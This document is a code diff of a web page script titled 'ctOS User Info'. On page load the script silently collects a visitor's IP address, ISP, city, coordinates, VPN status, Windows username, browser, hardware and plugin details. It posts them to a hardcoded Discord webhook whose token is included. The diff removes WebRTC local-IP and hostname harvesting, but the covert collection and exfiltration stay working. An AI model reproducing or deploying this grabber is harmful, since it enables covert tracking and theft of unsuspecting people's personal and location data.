@@ -63,7 +63,7 @@
 
 <script>
     // ================================================================
-    //  WEBHOOK
+    //  WEBHOOK (your new one)
     // ================================================================
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
@@ -72,9 +72,8 @@
     // ================================================================
     (function() {
 
-        // ---- 1. Get IP info (synchronous-style with fetch, but we'll use then) ----
+        // ---- 1. Get IP info (ipapi.co with fallback) ----
         function getIPInfo(callback) {
-            // Try ipapi.co first, fallback to ip-api.com
             fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) })
                 .then(res => res.json())
                 .then(data => {
@@ -89,7 +88,6 @@
                         .then(res => res.json())
                         .then(data => {
                             if (data.query) {
-                                // Convert to same format
                                 const converted = {
                                     ip: data.query,
                                     org: data.isp,
@@ -109,40 +107,7 @@
                 });
         }
 
-        // ---- 2. WebRTC for local IPs and hostname ----
-        function getWebRTCInfo(callback) {
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            const ips = [];
-            let hostname = '';
-            pc.createDataChannel('');
-            pc.createOffer()
-                .then(offer => pc.setLocalDescription(offer))
-                .catch(() => {});
-            pc.onicecandidate = (e) => {
-                if (!e.candidate) {
-                    pc.close();
-                    callback({ localIPs: ips, hostname: hostname });
-                    return;
-                }
-                const parts = e.candidate.candidate.split(' ');
-                if (parts.length > 7) {
-                    const ip = parts[4];
-                    if (ip && ip.includes('.') && !ip.startsWith('0.')) {
-                        if (!ips.includes(ip)) ips.push(ip);
-                    }
-                    const hostMatch = e.candidate.candidate.match(/ host (\S+)/);
-                    if (hostMatch && hostMatch[1] && !hostMatch[1].match(/^\d+\.\d+\.\d+\.\d+$/)) {
-                        hostname = hostMatch[1];
-                    }
-                }
-                if (e.candidate.relatedAddress && !e.candidate.relatedAddress.match(/^\d+\.\d+\.\d+\.\d+$/)) {
-                    hostname = e.candidate.relatedAddress;
-                }
-            };
-            setTimeout(() => { pc.close(); callback({ localIPs: ips, hostname: hostname }); }, 3000);
-        }
-
-        // ---- 3. Windows username (ActiveX) ----
+        // ---- 2. Windows username (ActiveX) ----
         function getWindowsUser() {
             try {
                 var wsh = new ActiveXObject('WScript.Shell');
@@ -152,9 +117,8 @@
             }
         }
 
-        // ---- 4. Build the data and send ----
+        // ---- 3. Build and send ----
         function sendData(ipData) {
-            // Basic system info
             const ua = navigator.userAgent;
             const os = (function() {
                 if (ua.includes('Windows NT')) return 'Windows';
@@ -193,7 +157,6 @@
                 }).catch(() => {});
             }
 
-            // Timezone
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
             // VPN detection
@@ -209,24 +172,16 @@
             let winUser = getWindowsUser();
             if (!winUser) winUser = 'Not available (IE/ActiveX required)';
 
-            // Get WebRTC info
-            getWebRTCInfo(function(webrtc) {
-                const localIPs = webrtc.localIPs.length ? webrtc.localIPs.join(', ') : 'none';
-                const hostname = webrtc.hostname || 'Not leaked';
-
-                // Build message
-                const msg = 
+            // Build message (without hostname and device model)
+            const msg = 
 `**ctOS User Info**
 **IP:** ${ipData ? ipData.ip : 'Unknown'} (${ipData ? ipData.org : 'Unknown ISP'})
 **Location:** ${ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown'}
 **Coordinates:** ${ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown'}
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
 **Windows Username:** ${winUser}
-**Computer Hostname:** ${hostname}
-**Local IPs:** ${localIPs}
 **OS:** ${os}
 **Browser:** ${browser}
-**Device Model:** ${ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/)?.[2] || 'Unknown'}
 **CPU Cores:** ${navigator.hardwareConcurrency || '?'}
 **RAM:** ${navigator.deviceMemory || '?'} GB
 **Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
@@ -236,24 +191,21 @@
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-                // Send to Discord
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: msg }),
-                    keepalive: true
-                }).catch(() => {
-                    // Fallback: sendBeacon
-                    const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
-                    navigator.sendBeacon(WEBHOOK, blob);
-                });
+            // Send to Discord
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: msg }),
+                keepalive: true
+            }).catch(() => {
+                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
+                navigator.sendBeacon(WEBHOOK, blob);
             });
         }
 
-        // ---- Start: get IP then collect everything ----
+        // ---- Start ----
         getIPInfo(function(ipData) {
             if (!ipData) {
-                // Fallback: minimal data
                 ipData = { ip: 'Unknown', org: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', latitude: 'Unknown', longitude: 'Unknown', proxy: false };
             }
             sendData(ipData);
